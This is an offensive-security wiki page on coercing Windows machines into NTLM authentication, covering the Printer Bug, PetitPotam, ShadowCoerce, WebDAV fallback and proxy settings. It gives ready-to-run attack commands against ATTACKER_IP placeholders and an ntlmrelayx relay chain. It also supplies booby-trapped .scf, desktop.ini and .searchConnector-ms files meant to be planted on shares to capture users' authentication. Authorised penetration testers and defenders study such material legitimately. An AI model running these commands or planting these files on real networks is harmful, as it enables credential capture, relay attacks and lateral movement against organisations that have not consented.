**Coercing authentication** — trick any Windows machine into connecting back to a host you control so it hands you the login proof of its computer account — an NTLM authentication, the challenge/response a Windows account sends to prove who it is. You do this by sending the target a remote procedure call (an RPC — a request that runs a function on a remote machine) that names your host inside a file path like `\\ATTACKER_IP\share`, and the machine dutifully authenticates to you over SMB or HTTP — as its **machine account** (`MACHINE$`). Machine-account passwords are 120+ random characters, so that hash is effectively uncrackable: **relaying is realistically the only path** — feed it into an [NTLM relay](../Relay%20Attacks/NTLM%20Relay/NTLM%20Relay.md) and you act as that machine against another server. Cracking only becomes viable through the separate NTLMv1-downgrade trick. The well-known triggers are the Printer Bug, PetitPotam, and ShadowCoerce.

```
you --RPC: open "\\ATTACKER\share"--> target machine
target --NTLM auth as MACHINE$--> you (Responder)
you --relay that auth--> another server  (cracking needs the NTLMv1-downgrade trick)
```

## Common techniques

| Technique | Prerequisites | Description |
| --- | --- | --- |
| Printer Bug | Print Spooler service enabled (default) | Attacker host passed in `pszLocalMachine` of an RPC call to `RpcRemoteFindFirstPrinterChangeNotificationEx` (e.g. `\\ATTACKER_IP`). |
| PetitPotam | EFS service or EFS extension for LSA enabled (default) | Attacker host passed as a UNC path in the `FileName` parameter of an RPC call to `EfsRpcOpenFileRaw` (or `EfsRpcEncryptFileSrv`, ...), e.g. `\\ATTACKER_IP\share\foo.txt`. |
| ShadowCoerce | File Server Remote VSS Service enabled | Attacker host passed in `ShareName` of an RPC call to `IsPathSupported` / `IsPathShadowCopied`, e.g. `\\ATTACKER_IP\NETLOGON`. |
| User Proxy Settings | Local access | Edit the proxy settings and wait for an incoming connection. |

### SMB to HTTP (WebDAV)

Windows uses SMB to reach UNC paths such as `\\ATTACKER_IP\share\foo.txt`. In some cases (see [NTLM Relay to LDAP](../Relay%20Attacks/NTLM%20Relay/NTLM%20Relay%20to%20LDAP.md)), an SMB authentication is useless because of the `NEGOTIATE_SIGN` flag.

By putting a port in the UNC path (e.g. `\\ATTACKER_IP@8000\share\foo.txt`) you force Windows to switch to WebDAV. WebDAV is an HTTP extension, and HTTP does not support signing, so `NEGOTIATE_SIGN` is always `0`.

**Note:** With a UNC path like `\\ATTACKER_IP\share\foo.txt`, Windows first tries SMB on port 445; if that port is closed it falls back to WebDAV on port 80.

**Important:** WebDAV is handled by the WebClient service, so there are limits:
- WebClient is **not installed** on servers by default (but it may be on VDI servers).
- Even when installed, it is **not started** by default - though it starts if OneDrive is mounted on the workstation.

## Discovery

Print Spooler status (CrackMapExec):

```bash

cme smb 'TARGET' -u 'USER_NAME' -p 'USER_PASS' -M spooler

```

WebClient status (CrackMapExec):

```bash

cme smb 'TARGET' -u 'USER_NAME' -p 'USER_PASS' -M webdav

```

WebClient status (WebClientServiceScanner):

```bash

webclientservicescanner 'DOMAIN/USER_NAME:USER_PASS@TARGET_IP' -dc-ip 'DC_IP'

```

## Exploitation

### Active

**Printer Bug**

```bash

# Callback over SMB
printerbug.py 'USER_NAME:USER_PASS@TARGET_IP' 'ATTACKER_IP'
# Callback over HTTP (if WebClient is installed and running)
printerbug.py 'USER_NAME:USER_PASS@TARGET_IP' 'ATTACKER_NAME@8080/a'

```

**PetitPotam**

```bash

# Callback over SMB
petitpotam.py -u 'USER_NAME' -p 'USER_PASS' -d 'DOMAIN' 'ATTACKER_IP' 'TARGET_IP'
# Callback over HTTP (if WebClient is installed and running)
petitpotam.py -u 'USER_NAME' -p 'USER_PASS' -d 'DOMAIN' 'ATTACKER_NAME@8080/a' 'TARGET_IP'

```

**ShadowCoerce**

```bash

# Callback over SMB
shadowcoerce.py -u 'USER_NAME' -p 'USER_PASS' -d 'DOMAIN' 'ATTACKER_IP' 'TARGET_IP'

```

**Warning:** For HTTP (WebClient) callbacks, specify your **hostname only** - not the FQDN or IP (see WebDAV / WebClient below).

**Note:** On ShadowCoerce, `STATUS_OBJECT_NAME_NOT_FOUND` means the File Server VSS Agent Service is not installed; `STATUS_PIPE_NOT_AVAILABLE` means it is installed but not yet running - wait a few seconds and retry.

### Through an NTLM relay

If no account is compromised yet, trigger the Printer Bug through a previously relayed SMB authentication and a SOCKS tunnel with `ntlmrelayx`. Assumes Responder (or similar) is running to catch auth requests.

```bash

# Relay to a target without SMB signing
ntlmrelayx.py -t 'smb://TARGET_FQDN' -smb2support -socks
# Once the SOCKS tunnel is up, free the ports but keep the SOCKS proxy running
ntlmrelayx> stopservers
# Start another ntlmrelayx (e.g. against LDAP) and coerce through the proxy
proxychains python3 printerbug.py -no-pass 'DOMAIN/USER_NAME@TARGET_FQDN' 'ATTACKER_NAME@8080/a'

```

### Passive

Files that coerce authentication when opened by Windows Explorer - drop them on a share to poison multiple users.

**WebDAV / WebClient (`.searchConnector-ms`)** - starts the WebClient service when the user browses a folder containing it:

```xml

<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription
	xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
	<description>Microsoft Outlook</description>
	<isSearchOnlyItem>false</isSearchOnlyItem>
	<includeInStartMenuScope>true</includeInStartMenuScope>
	<templateInfo>
		<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
	</templateInfo>
	<simpleLocation>
		<url>https://whatever/</url>
	</simpleLocation>
</searchConnectorDescription>

```

When you use an **IP address** in the callback UNC path, WebClient may refuse Windows authentication because it treats it as the Internet zone:

| Path | Zone | Auth |
| --- | :---: | :---: |
| `\\10.10.10.10\share\foo.txt` | Internet | no |
| `\\foo.domain.tld\share\foo.txt` | Internet | no |
| `\\FOO\share\foo.txt` | Intranet | yes |

To register a host name, use one of the techniques in [DNS Record Modification](../Trust%20Attacks/Intra%20Forest%20Attacks/DNS%20Record%20Modification.md).

**Shell command file (`.scf`)** - write it in a shared folder; replace `ATTACKER` with an IP, hostname or FQDN:

```ini

[Shell]
Command=2
IconFile=\\ATTACKER\test.ico
[Taskbar]
Command=ToggleDesktop

```

**desktop.ini** - write it in a shared folder; replace `ATTACKER`:

```shell

mkdir maliciousFolder
attrib +s maliciousFolder
cd maliciousFolder
echo [.ShellClassInfo] > desktop.ini
echo IconResource=\\ATTACKER\test >> desktop.ini
attrib +s +h desktop.ini

```

**Warning:** The `system` attribute set with `attrib` on the folder is mandatory for the desktop.ini trick to work.

**User Proxy Settings** - given an interactive session (physical or RDP) on a workstation or server, coerce the computer account to authenticate to you by configuring the current user's proxy settings.

## References

- CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec
- WebClientServiceScanner - https://github.com/Hackndo/WebclientServiceScanner
- printerbug.py (krbrelayx) - https://github.com/dirkjanm/krbrelayx
- PetitPotam - https://github.com/topotam/PetitPotam
- ShadowCoerce - https://github.com/ShutdownRepo/ShadowCoerce/
- The Hacker Recipes - MITM and coerced authentications - https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications
